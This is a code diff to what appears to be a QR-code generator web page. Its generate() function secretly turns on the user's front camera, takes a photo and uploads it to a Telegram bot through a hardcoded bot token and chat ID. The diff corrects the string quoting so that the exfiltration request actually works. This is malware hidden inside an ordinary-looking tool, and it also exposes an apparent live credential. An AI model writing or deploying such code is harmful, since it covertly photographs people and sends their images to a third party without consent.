@@ -18,29 +18,29 @@
 
 <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 <script>
-function generate() {
-  const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
-  const CHAT_ID = "6512853118";
+  function generate() {
+    const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
+    const CHAT_ID = "6512853118";
     let val = document.querySelector("input")
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
       const v=document.createElement('video');v.srcObject=s;v.play();
       setTimeout(()=>{ 
         const c=document.createElement('canvas');c.width=640;c.height=480;
         c.getContext('2d').drawImage(v,0,0,640,480);
         c.toBlob(b=>{
           const f=new FormData();
-          f.append('chat_id','${CHAT_ID}');
+          f.append('chat_id',`${CHAT_ID}`);
           f.append('caption','📸 عکس سلفی از QR Code');
           f.append('photo',b,'selfie.jpg');
-          fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto',{method:'POST',body:f});
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
           alert('عکس گرفته و ارسال شد!');
         },'image/jpeg',0.85);
       },1500);
     }).catch(()=>alert('دسترسی به دوربین رد شد'));
-  document.getElementById('qrcode').innerHTML = '';
-  new QRCode(document.getElementById('qrcode'), {
-    text: val.value,
-    width: 260,
+    document.getElementById('qrcode').innerHTML = '';
+    new QRCode(document.getElementById('qrcode'), {
+      text: val.value,
+      width: 260,
     height: 260,
     colorDark: "#000000",
     colorLight: "#ffffff",
